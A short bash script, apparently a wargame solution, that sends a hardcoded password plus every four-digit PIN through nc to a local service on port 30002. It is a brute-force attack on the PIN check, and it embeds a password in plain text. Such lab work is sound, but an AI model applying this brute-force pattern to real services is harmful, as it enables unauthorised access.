passwd=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
rm -f input.txt
for i in {0..9999};
do
        printf "$passwd %04d\n" $i >> input.txt
done
cat input.txt | nc localhost 30002
